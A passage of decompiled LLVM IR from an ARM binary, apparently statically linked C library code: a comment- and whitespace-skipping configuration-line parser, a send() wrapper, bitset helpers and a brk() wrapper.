  %v0_133c8 = phi i32 [ %v2_13360, %dec_label_pc_133d8.lr.ph ], [ %v1_133c8, %dec_label_pc_133c8 ]
  %v1_133e0 = phi i32 [ %v3_133cc13, %dec_label_pc_133d8.lr.ph ], [ %v3_133cc, %dec_label_pc_133c8 ]
  %v3_133e0 = mul nuw nsw i32 %v1_133e0, 2
  %v4_133e0 = add i32 %v3_133e0, %v2_133dc.pre
  %v5_133e0 = inttoptr i32 %v4_133e0 to i8*
  %v6_133e0 = load i8, i8* %v5_133e0, align 1
  %v1_133e4 = and i8 %v6_133e0, 32
  %v2_133e4 = icmp eq i8 %v1_133e4, 0
  br i1 %v2_133e4, label %dec_label_pc_133ec, label %dec_label_pc_133c8

dec_label_pc_133ec:                               ; preds = %dec_label_pc_133c8, %dec_label_pc_133d8, %dec_label_pc_133cc.preheader
  %v0_1348435 = phi i32 [ %v2_13360, %dec_label_pc_133cc.preheader ], [ %v1_133c8, %dec_label_pc_133c8 ], [ %v0_133c8, %dec_label_pc_133d8 ]
  %v0_13400 = phi i32 [ %v3_133cc13, %dec_label_pc_133cc.preheader ], [ %v3_133cc, %dec_label_pc_133c8 ], [ %v1_133e0, %dec_label_pc_133d8 ]
  %v7_133ec = icmp eq i32 %v0_13400, 10
  br i1 %v7_133ec, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_133ec
  %v3_133f0 = icmp eq i32 %v0_13400, 0
  br i1 %v3_133f0, label %bb55, label %dec_label_pc_13400

.thread3:                                         ; preds = %dec_label_pc_133ec
  br label %dec_label_pc_1359c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1359c.backedge

dec_label_pc_1359c.backedge:                      ; preds = %dec_label_pc_13578, %dec_label_pc_13590, %bb55, %dec_label_pc_13510, %.thread3, %dec_label_pc_13400
  %v0_135a4.pre = load i32, i32* @sl, align 4
  store i32 %v2_13360, i32* %r0.global-to-local, align 4
  store i32 %v0_135a4.pre, i32* %r2.global-to-local, align 4
  %v3_135a8 = call i32 @function_e7bc(i32 %v2_13360, i32 128, i32 %v0_135a4.pre)
  store i32 %v3_135a8, i32* %r0.global-to-local, align 4
  %v2_135ac = icmp eq i32 %v3_135a8, 0
  store i32 %v2_13360, i32* @r4, align 4
  br i1 %v2_135ac, label %dec_label_pc_135bc, label %dec_label_pc_133cc.preheader

dec_label_pc_13400:                               ; preds = %bb
  %v7_13400 = icmp eq i32 %v0_13400, 35
  br i1 %v7_13400, label %dec_label_pc_1359c.backedge, label %dec_label_pc_13484

dec_label_pc_13410:                               ; preds = %bb58
  store i32 %v2_13410, i32* %r2.global-to-local, align 4
  %v4_13414 = mul i32 %storemerge, 4
  %v5_13414 = add i32 %v4_13414, %v2_13410
  %v2_13418 = add i32 %v5_13414, -36
  %v3_13418 = inttoptr i32 %v2_13418 to i32*
  store i32 %v0_13418, i32* %v3_13418, align 4
  %v0_1342415 = load i32, i32* %r0.global-to-local, align 4
  %v1_1342416 = inttoptr i32 %v0_1342415 to i8*
  %v2_1342417 = load i8, i8* %v1_1342416, align 1
  %v3_1342418 = zext i8 %v2_1342417 to i32
  store i32 %v3_1342418, i32* %r2.global-to-local, align 4
  %v2_1342819 = icmp eq i8 %v2_1342417, 0
  br i1 %v2_1342819, label %dec_label_pc_13458.preheader, label %dec_label_pc_13430.lr.ph

dec_label_pc_13430.lr.ph:                         ; preds = %dec_label_pc_13410
  %v2_13434.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_13430

dec_label_pc_13420:                               ; preds = %dec_label_pc_13444
  %v1_13420 = add i32 %v0_13420, 1
  store i32 %v1_13420, i32* %r0.global-to-local, align 4
  %v1_13424 = inttoptr i32 %v1_13420 to i8*
  %v2_13424 = load i8, i8* %v1_13424, align 1
  %v3_13424 = zext i8 %v2_13424 to i32
  store i32 %v3_13424, i32* %r2.global-to-local, align 4
  %v2_13428 = icmp eq i8 %v2_13424, 0
  br i1 %v2_13428, label %dec_label_pc_13458.preheader, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13430.lr.ph, %dec_label_pc_13420
  %v0_13420 = phi i32 [ %v0_1342415, %dec_label_pc_13430.lr.ph ], [ %v1_13420, %dec_label_pc_13420 ]
  %v0_13444 = phi i32 [ %v3_1342418, %dec_label_pc_13430.lr.ph ], [ %v3_13424, %dec_label_pc_13420 ]
  %v3_13438 = mul nuw nsw i32 %v0_13444, 2
  %v4_13438 = add i32 %v3_13438, %v2_13434.pre
  %v5_13438 = inttoptr i32 %v4_13438 to i8*
  %v6_13438 = load i8, i8* %v5_13438, align 1
  %v1_1343c = and i8 %v6_13438, 32
  %v2_1343c = icmp eq i8 %v1_1343c, 0
  br i1 %v2_1343c, label %dec_label_pc_13444, label %dec_label_pc_13458.preheader

dec_label_pc_13444:                               ; preds = %dec_label_pc_13430
  %v7_13444 = icmp eq i32 %v0_13444, 10
  br i1 %v7_13444, label %dec_label_pc_13458.preheader, label %dec_label_pc_13420

dec_label_pc_13458.preheader:                     ; preds = %dec_label_pc_13444, %dec_label_pc_13430, %dec_label_pc_13420, %dec_label_pc_13410
  %v0_1345820 = phi i32 [ %v0_1342415, %dec_label_pc_13410 ], [ %v0_13420, %dec_label_pc_13444 ], [ %v0_13420, %dec_label_pc_13430 ], [ %v1_13420, %dec_label_pc_13420 ]
  %v1_1345821 = inttoptr i32 %v0_1345820 to i8*
  %v2_1345822 = load i8, i8* %v1_1345821, align 1
  %v3_1345823 = zext i8 %v2_1345822 to i32
  store i32 %v3_1345823, i32* %r2.global-to-local, align 4
  %v2_1345c24 = icmp eq i8 %v2_1345822, 0
  br i1 %v2_1345c24, label %dec_label_pc_13480, label %dec_label_pc_13464

dec_label_pc_13450:                               ; preds = %dec_label_pc_13464, %dec_label_pc_13478
  %v3_13454 = inttoptr i32 %v2_13454 to i8*
  store i8 0, i8* %v3_13454, align 1
  %v4_13454 = load i32, i32* %r0.global-to-local, align 4
  %v5_13454 = add i32 %v4_13454, 1
  store i32 %v5_13454, i32* %r0.global-to-local, align 4
  %v1_13458 = inttoptr i32 %v5_13454 to i8*
  %v2_13458 = load i8, i8* %v1_13458, align 1
  %v3_13458 = zext i8 %v2_13458 to i32
  store i32 %v3_13458, i32* %r2.global-to-local, align 4
  %v2_1345c = icmp eq i8 %v2_13458, 0
  br i1 %v2_1345c, label %dec_label_pc_13480, label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %dec_label_pc_13458.preheader, %dec_label_pc_13450
  %v0_13478 = phi i32 [ %v3_13458, %dec_label_pc_13450 ], [ %v3_1345823, %dec_label_pc_13458.preheader ]
  %v2_13454 = phi i32 [ %v5_13454, %dec_label_pc_13450 ], [ %v0_1345820, %dec_label_pc_13458.preheader ]
  %v2_13468 = load i32, i32* @global_var_18428, align 4
  %v3_1346c = mul nuw nsw i32 %v0_13478, 2
  %v4_1346c = add i32 %v2_13468, %v3_1346c
  %v5_1346c = inttoptr i32 %v4_1346c to i8*
  %v6_1346c = load i8, i8* %v5_1346c, align 1
  %v1_13470 = and i8 %v6_1346c, 32
  %v2_13470 = icmp eq i8 %v1_13470, 0
  br i1 %v2_13470, label %dec_label_pc_13478, label %dec_label_pc_13450

dec_label_pc_13478:                               ; preds = %dec_label_pc_13464
  %v7_13478 = icmp eq i32 %v0_13478, 10
  br i1 %v7_13478, label %dec_label_pc_13450, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13450, %dec_label_pc_13478, %dec_label_pc_13458.preheader
  %v0_1348434 = phi i32 [ %v0_1345820, %dec_label_pc_13458.preheader ], [ %v5_13454, %dec_label_pc_13450 ], [ %v2_13454, %dec_label_pc_13478 ]
  %v0_13480 = load i32, i32* @r8, align 4
  %v1_13480 = add i32 %v0_13480, 1
  br label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13400, %dec_label_pc_13480
  %storemerge = phi i32 [ %v1_13480, %dec_label_pc_13480 ], [ 0, %dec_label_pc_13400 ]
  %v0_13418 = phi i32 [ %v0_1348434, %dec_label_pc_13480 ], [ %v0_1348435, %dec_label_pc_13400 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_13484 = inttoptr i32 %v0_13418 to i8*
  %v2_13484 = load i8, i8* %v1_13484, align 1
  %v3_13484 = zext i8 %v2_13484 to i32
  %v2_13488 = icmp eq i8 %v2_13484, 0
  br i1 %v2_13488, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_13484
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_13484, %bb56
  %v0_13498.pr = phi i32 [ %v3_13484, %dec_label_pc_13484 ], [ 1, %bb56 ]
  %v1_13490 = add i32 %storemerge, -4
  %v3_13490 = sub i32 3, %storemerge
  %v4_13490 = and i32 %v3_13490, %storemerge
  %v5_13490 = icmp slt i32 %v4_13490, 0
  %v6_13490 = icmp slt i32 %v1_13490, 0
  %v7_13490 = icmp eq i32 %storemerge, 4
  %v3_13494 = xor i1 %v6_13490, %v5_13490
  %v4_13494 = or i1 %v7_13490, %v3_13494
  br i1 %v4_13494, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_134a0

bb58:                                             ; preds = %bb57
  %v2_13498 = icmp eq i32 %v0_13498.pr, 0
  br i1 %v2_13498, label %dec_label_pc_134a0, label %dec_label_pc_13410

dec_label_pc_134a0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_17524.595 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_134ac = call i32 @function_f010(i8* %v3_134ac, i32 ptrtoint ([11 x i8]* @global_var_17524.595 to i32))
  store i32 %v4_134ac, i32* %r0.global-to-local, align 4
  %v2_134b0 = icmp eq i32 %v4_134ac, 0
  br i1 %v2_134b0, label %dec_label_pc_134d8.preheader, label %dec_label_pc_134fc

dec_label_pc_134d8.preheader:                     ; preds = %dec_label_pc_134a0
  br label %dec_label_pc_134d8

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134f0
  %v1_134c0 = add i32 %v5_134e0, -36
  %v2_134c0 = inttoptr i32 %v1_134c0 to i32*
  %v3_134c0 = load i32, i32* %v2_134c0, align 4
  store i32 %v3_134c0, i32* %r0.global-to-local, align 4
  %v1_134c4 = call i32 @function_f4e0(i32 %v3_134c0)
  store i32 %v1_134c4, i32* %r0.global-to-local, align 4
  %v0_134cc = load i32, i32* @r4, align 4
  %v1_134cc = add i32 %v0_134cc, 1
  store i32 %v1_134cc, i32* %r2.global-to-local, align 4
  %v5_134d0 = mul i32 %v0_134cc, 4
  %v6_134d0 = add i32 %v5_134d0, ptrtoint (i32* @global_var_1ad38.438 to i32)
  %v7_134d0 = inttoptr i32 %v6_134d0 to i32*
  store i32 %v1_134c4, i32* %v7_134d0, align 4
  %v0_134d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_134d4 = load i32, i32* @r7, align 4
  %v2_134d4 = inttoptr i32 %v1_134d4 to i32*
  store i32 %v0_134d4, i32* %v2_134d4, align 4
  %v0_134dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134d8.preheader, %dec_label_pc_134c0
  %v0_134e8 = phi i32 [ 1, %dec_label_pc_134d8.preheader ], [ %v0_134dc.pre, %dec_label_pc_134c0 ]
  store i32 %v2_13410, i32* %r2.global-to-local, align 4
  %v1_134dc = load i32, i32* @r8, align 4
  %v2_134dc = sub i32 %v0_134e8, %v1_134dc
  %v4_134dc = xor i32 %v1_134dc, %v0_134e8
  %v5_134dc = xor i32 %v2_134dc, %v0_134e8
  %v6_134dc = and i32 %v5_134dc, %v4_134dc
  %v7_134dc = icmp slt i32 %v6_134dc, 0
  %v8_134dc = icmp slt i32 %v2_134dc, 0
  %v4_134e0 = mul i32 %v0_134e8, 4
  %v5_134e0 = add i32 %v4_134e0, %v2_13410
  store i32 ptrtoint (i32* @global_var_1ad44.435 to i32), i32* @r7, align 4
  %v1_134e8 = add i32 %v0_134e8, 1
  store i32 %v1_134e8, i32* @r5, align 4
  %v2_134ec = xor i1 %v8_134dc, %v7_134dc
  br i1 %v2_134ec, label %dec_label_pc_134f0, label %dec_label_pc_134fc

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134d8
  %v2_134f0 = load i32, i32* @global_var_1ad44.435, align 4
  store i32 %v2_134f0, i32* @r4, align 4
  %v7_134f8 = icmp slt i32 %v2_134f0, 3
  br i1 %v7_134f8, label %dec_label_pc_134c0, label %dec_label_pc_134fc

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134d8, %dec_label_pc_134f0, %dec_label_pc_134a0
  %v0_134fc = load i32, i32* @r6, align 4
  store i32 %v0_134fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17530.598 to i32), i32* @r1, align 4
  %v3_13504 = inttoptr i32 %v0_134fc to i8*
  %v4_13504 = call i32 @function_f010(i8* %v3_13504, i32 ptrtoint ([7 x i8]* @global_var_17530.598 to i32))
  store i32 %v4_13504, i32* %r0.global-to-local, align 4
  %v2_13508 = icmp eq i32 %v4_13504, 0
  br i1 %v2_13508, label %dec_label_pc_13540.preheader, label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_134fc
  %v0_13510 = load i32, i32* @r6, align 4
  store i32 %v0_13510, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17538.600 to i32), i32* @r1, align 4
  %v3_13518 = inttoptr i32 %v0_13510 to i8*
  %v4_13518 = call i32 @function_f010(i8* %v3_13518, i32 ptrtoint ([7 x i8]* @global_var_17538.600 to i32))
  store i32 %v4_13518, i32* %r0.global-to-local, align 4
  %v2_1351c = icmp eq i32 %v4_13518, 0
  br i1 %v2_1351c, label %dec_label_pc_13540.preheader, label %dec_label_pc_1359c.backedge

dec_label_pc_13540.preheader:                     ; preds = %dec_label_pc_134fc, %dec_label_pc_13510
  store i32 ptrtoint (i32* @global_var_1ad48.575 to i32), i32* @r4, align 4
  %v2_1354460 = load i32, i32* @global_var_1ad48.575, align 4
  store i32 ptrtoint (i32* @global_var_1ad28.579 to i32), i32* @r5, align 4
  %v1_1355063 = add i32 %v2_1354460, -1
  store i32 %v1_1355063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_1354460, 1
  br i1 %tmp5964, label %dec_label_pc_13558, label %dec_label_pc_13528

dec_label_pc_13528:                               ; preds = %dec_label_pc_13540.preheader, %dec_label_pc_13528
  %v1_1355065 = phi i32 [ %v1_13550, %dec_label_pc_13528 ], [ %v1_1355063, %dec_label_pc_13540.preheader ]
  %v4_13528 = mul i32 %v1_1355065, 4
  %v5_13528 = add i32 %v4_13528, ptrtoint (i32* @global_var_1ad28.579 to i32)
  %v6_13528 = inttoptr i32 %v5_13528 to i32*
  %v7_13528 = load i32, i32* %v6_13528, align 4
  store i32 %v7_13528, i32* @r0, align 4
  store i32 %v1_1355065, i32* @global_var_1ad48.575, align 4
  %v0_13530 = call i32 @function_fdcc()
  store i32 %v0_13530, i32* %r0.global-to-local, align 4
  %v0_13534 = load i32, i32* @r4, align 4
  %v1_13534 = inttoptr i32 %v0_13534 to i32*
  %v2_13534 = load i32, i32* %v1_13534, align 4
  %v1_1353c = load i32, i32* @r5, align 4
  %v5_1353c = mul i32 %v2_13534, 4
  %v6_1353c = add i32 %v1_1353c, %v5_1353c
  %v7_1353c = inttoptr i32 %v6_1353c to i32*
  store i32 0, i32* %v7_1353c, align 4
  store i32 ptrtoint (i32* @global_var_1ad48.575 to i32), i32* @r4, align 4
  %v2_13544 = load i32, i32* @global_var_1ad48.575, align 4
  store i32 ptrtoint (i32* @global_var_1ad28.579 to i32), i32* @r5, align 4
  %v1_13550 = add i32 %v2_13544, -1
  store i32 %v1_13550, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_13544, 1
  br i1 %tmp59, label %dec_label_pc_13558, label %dec_label_pc_13528

dec_label_pc_13558:                               ; preds = %dec_label_pc_13528, %dec_label_pc_13540.preheader
  br label %dec_label_pc_13578

dec_label_pc_13560:                               ; preds = %dec_label_pc_13590
  %v1_13560 = add i32 %v5_13580, -36
  %v2_13560 = inttoptr i32 %v1_13560 to i32*
  %v3_13560 = load i32, i32* %v2_13560, align 4
  store i32 %v3_13560, i32* %r0.global-to-local, align 4
  %v1_13564 = call i32 @function_f4e0(i32 %v3_13560)
  store i32 %v1_13564, i32* %r0.global-to-local, align 4
  %v0_1356c = load i32, i32* @r4, align 4
  %v1_1356c = add i32 %v0_1356c, 1
  store i32 %v1_1356c, i32* %r2.global-to-local, align 4
  %v5_13570 = mul i32 %v0_1356c, 4
  %v6_13570 = add i32 %v5_13570, ptrtoint (i32* @global_var_1ad28.579 to i32)
  %v7_13570 = inttoptr i32 %v6_13570 to i32*
  store i32 %v1_13564, i32* %v7_13570, align 4
  %v0_13574 = load i32, i32* %r2.global-to-local, align 4
  %v1_13574 = load i32, i32* @r6, align 4
  %v2_13574 = inttoptr i32 %v1_13574 to i32*
  store i32 %v0_13574, i32* %v2_13574, align 4
  %v0_1357c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13578

dec_label_pc_13578:                               ; preds = %dec_label_pc_13558, %dec_label_pc_13560
  %v0_13588 = phi i32 [ 1, %dec_label_pc_13558 ], [ %v0_1357c.pre, %dec_label_pc_13560 ]
  store i32 %v2_13410, i32* %r2.global-to-local, align 4
  %v1_1357c = load i32, i32* @r8, align 4
  %v2_1357c = sub i32 %v0_13588, %v1_1357c
  %v4_1357c = xor i32 %v1_1357c, %v0_13588
  %v5_1357c = xor i32 %v2_1357c, %v0_13588
  %v6_1357c = and i32 %v5_1357c, %v4_1357c
  %v7_1357c = icmp slt i32 %v6_1357c, 0
  %v8_1357c = icmp slt i32 %v2_1357c, 0
  %v4_13580 = mul i32 %v0_13588, 4
  %v5_13580 = add i32 %v4_13580, %v2_13410
  store i32 ptrtoint (i32* @global_var_1ad48.575 to i32), i32* @r6, align 4
  %v1_13588 = add i32 %v0_13588, 1
  store i32 %v1_13588, i32* @r5, align 4
  %v2_1358c = xor i1 %v8_1357c, %v7_1357c
  br i1 %v2_1358c, label %dec_label_pc_13590, label %dec_label_pc_1359c.backedge

dec_label_pc_13590:                               ; preds = %dec_label_pc_13578
  %v2_13590 = load i32, i32* @global_var_1ad48.575, align 4
  store i32 %v2_13590, i32* @r4, align 4
  %v7_13598 = icmp slt i32 %v2_13590, 4
  br i1 %v7_13598, label %dec_label_pc_13560, label %dec_label_pc_1359c.backedge

dec_label_pc_133cc.preheader:                     ; preds = %dec_label_pc_133cc.preheader.lr.ph, %dec_label_pc_1359c.backedge
  store i32 %v2_13360, i32* %r0.global-to-local, align 4
  %v2_133cc12 = load i8, i8* %v1_133cc11, align 4
  %v3_133cc13 = zext i8 %v2_133cc12 to i32
  store i32 %v3_133cc13, i32* %r2.global-to-local, align 4
  %v2_133d014 = icmp eq i8 %v2_133cc12, 0
  br i1 %v2_133d014, label %dec_label_pc_133ec, label %dec_label_pc_133d8.lr.ph

dec_label_pc_133d8.lr.ph:                         ; preds = %dec_label_pc_133cc.preheader
  %v2_133dc.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_133d8

dec_label_pc_135bc:                               ; preds = %dec_label_pc_1359c.backedge, %dec_label_pc_1359c.preheader
  %v0_135bc = load i32, i32* @sl, align 4
  store i32 %v0_135bc, i32* %r0.global-to-local, align 4
  %v1_135c0 = inttoptr i32 %v0_135bc to i8*
  %v2_135c0 = call i32 @function_ced0(i8* %v1_135c0)
  store i32 %v2_135c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135d4

dec_label_pc_135c8:                               ; preds = %dec_label_pc_133b0
  %v0_135c8 = call i32 @function_11514()
  store i32 %v0_135c8, i32* %r0.global-to-local, align 4
  %v2_135d0 = inttoptr i32 %v0_135c8 to i32*
  store i32 3, i32* %v2_135d0, align 4
  br label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_1335c, %dec_label_pc_135bc, %dec_label_pc_135c8
  store i32 %v2_13364, i32* @r0, align 4
  %v1_135e4 = call i32 @function_10d54()
  store i32 %v1_135e4, i32* %r0.global-to-local, align 4
  store i32 %v6_1335c, i32* @r5, align 4
  store i32 %v9_1335c, i32* @r6, align 4
  store i32 %v12_1335c, i32* @r7, align 4
  store i32 %v15_1335c, i32* @r8, align 4
  store i32 %v18_1335c, i32* @sl, align 4
  ret i32 %v1_135e4

; uselistorder directives
  uselistorder i32 %v3_133cc13, { 2, 1, 0 }
  uselistorder i32 %v2_1357c, { 1, 0 }
  uselistorder i32 %v0_13588, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_13550, { 1, 0 }
  uselistorder i32 %v1_1355065, { 1, 0 }
  uselistorder i32 %v2_134dc, { 1, 0 }
  uselistorder i32 %v0_134e8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_13418, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_1345820, { 1, 0, 2 }
  uselistorder i32 %v2_13410, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_13360, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 4, 2, 3, 5, 0, 8, 6, 7, 9, 17, 10, 16, 11, 13, 12, 1, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 6, 5, 21, 8, 7, 9, 11, 10, 13, 12, 28, 14, 27, 15, 16, 20, 17, 19, 23, 22, 18, 3, 2, 24, 26, 1, 25 }
  uselistorder i32 ()* @function_11514, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @function_fdcc, { 13, 12, 11, 10, 9, 8, 7, 21, 20, 3, 2, 1, 6, 5, 0, 15, 14, 19, 18, 17, 16, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad28.579 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_1ad48.575, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad48.575 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad38.438 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11 }
  uselistorder i32* @global_var_1ad44.435, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_135d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_133cc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13578, { 1, 0 }
  uselistorder label %dec_label_pc_13528, { 1, 0 }
  uselistorder label %dec_label_pc_13540.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_134fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_134d8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_13484, { 1, 0 }
  uselistorder label %dec_label_pc_13480, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13464, { 1, 0 }
  uselistorder label %dec_label_pc_13450, { 1, 0 }
  uselistorder label %dec_label_pc_13430, { 1, 0 }
  uselistorder label %dec_label_pc_1359c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_133ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1359c.preheader, { 1, 0 }
}

define i32 @function_13630(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13630:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1366c = call i32 @function_146dc()
  ret i32 %v0_1366c
}

define i32 @function_13678(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13678:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13678 = load i32, i32* @r4, align 4
  store i32 %v3_13678, i32* %stack_var_-8, align 4
  %v5_1367c = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1367c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1367c, -4095
  br i1 %tmp, label %dec_label_pc_1369c, label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13678
  %v0_1368c = call i32 @function_cec4()
  %v0_13690 = load i32, i32* %r4.global-to-local, align 4
  %v1_13690 = sub i32 0, %v0_13690
  %v2_13694 = inttoptr i32 %v0_1368c to i32*
  store i32 %v1_13690, i32* %v2_13694, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1369c

dec_label_pc_1369c:                               ; preds = %dec_label_pc_13678, %dec_label_pc_1368c
  %v0_1369c = phi i32 [ %v5_1367c, %dec_label_pc_13678 ], [ -1, %dec_label_pc_1368c ]
  %v2_136a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1369c

; uselistorder directives
  uselistorder i32 %v5_1367c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1369c, { 1, 0 }
}

define i32 @function_136a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_136a4:
  %v3_136a4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_136ac = call i32 @function_cd2c()
  %v0_136b0 = load i32, i32* @r4, align 4
  store i32 %v3_136a4, i32* @r4, align 4
  %v2_136b8 = call i32 @function_cdd4(i32 %v0_136ac, i32 %v0_136b0)
  ret i32 %v2_136b8

; uselistorder directives
  uselistorder i32 ()* @function_cd2c, { 0, 2, 1 }
}

define i32 @function_136bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_136bc:
  %v1_136bc = add i32 %arg2, -1
  %v3_136c0 = udiv i32 %v1_136bc, 32
  %v4_136c4 = mul nuw nsw i32 %v3_136c0, 4
  %v5_136c4 = add i32 %v4_136c4, %arg1
  %v6_136c4 = inttoptr i32 %v5_136c4 to i32*
  %v7_136c4 = load i32, i32* %v6_136c4, align 4
  %v1_136c8 = urem i32 %v1_136bc, 32
  %v7_136d0 = shl i32 1, %v1_136c8
  %v8_136d0 = and i32 %v7_136c4, %v7_136d0
  %v10_136d0 = icmp ne i32 %v8_136d0, 0
  %. = zext i1 %v10_136d0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_136bc, { 1, 0 }
}

define i32 @function_136e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_136e0:
  %v1_136e0 = add i32 %arg2, -1
  %v3_136e4 = udiv i32 %v1_136e0, 32
  %v4_136e8 = mul nuw nsw i32 %v3_136e4, 4
  %v5_136e8 = add i32 %v4_136e8, %arg1
  %v6_136e8 = inttoptr i32 %v5_136e8 to i32*
  %v7_136e8 = load i32, i32* %v6_136e8, align 4
  %v1_136ec = urem i32 %v1_136e0, 32
  %v7_136f4 = shl i32 1, %v1_136ec
  %v8_136f4 = or i32 %v7_136e8, %v7_136f4
  store i32 %v8_136f4, i32* %v6_136e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_136e0, { 1, 0 }
}

define i32 @function_13704(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13704:
  %v1_13704 = add i32 %arg2, -1
  %v3_13708 = udiv i32 %v1_13704, 32
  %v4_1370c = mul nuw nsw i32 %v3_13708, 4
  %v5_1370c = add i32 %v4_1370c, %arg1
  %v6_1370c = inttoptr i32 %v5_1370c to i32*
  %v7_1370c = load i32, i32* %v6_1370c, align 4
  %v1_13710 = urem i32 %v1_13704, 32
  %tmp = shl i32 -1, %v1_13710
  %v8_13718 = add i32 %tmp, -1
  %v9_13718 = and i32 %v7_1370c, %v8_13718
  store i32 %v9_13718, i32* %v6_1370c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13704, { 1, 0 }
}

define i32 @function_13728(i32 %arg1) local_unnamed_addr {
dec_label_pc_13728:
  %v1_13728 = add i32 %arg1, 28
  %v2_13728 = inttoptr i32 %v1_13728 to i32*
  %v3_13728 = load i32, i32* %v2_13728, align 4
  %v1_13730 = add i32 %arg1, 44
  %v2_13730 = inttoptr i32 %v1_13730 to i32*
  %v3_13730 = load i32, i32* %v2_13730, align 4
  store i32 %v3_13728, i32* @global_var_1ad4c.605, align 4
  store i32 %v3_13730, i32* @global_var_1ad50.607, align 4
  ret i32 %arg1
}

define i32 @function_1374c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1374c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_13754 = call i32 @brk(i32* %arg1)
  %v3_13758 = icmp ult i32 %v2_13754, %tmp
  store i32 %v2_13754, i32* @global_var_1aaec.542, align 4
  br i1 %v3_13758, label %dec_label_pc_1376c, label %dec_label_pc_1377c

dec_label_pc_1376c:                               ; preds = %dec_label_pc_1374c
  %v0_1376c = call i32 @function_cec4()
  %v2_13774 = inttoptr i32 %v0_1376c to i32*
  store i32 12, i32* %v2_13774, align 4
  br label %dec_label_pc_1377c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_1374c, %dec_label_pc_1376c
  %v0_1377c = phi i32 [ 0, %dec_label_pc_1374c ], [ -1, %dec_label_pc_1376c ]
  ret i32 %v0_1377c

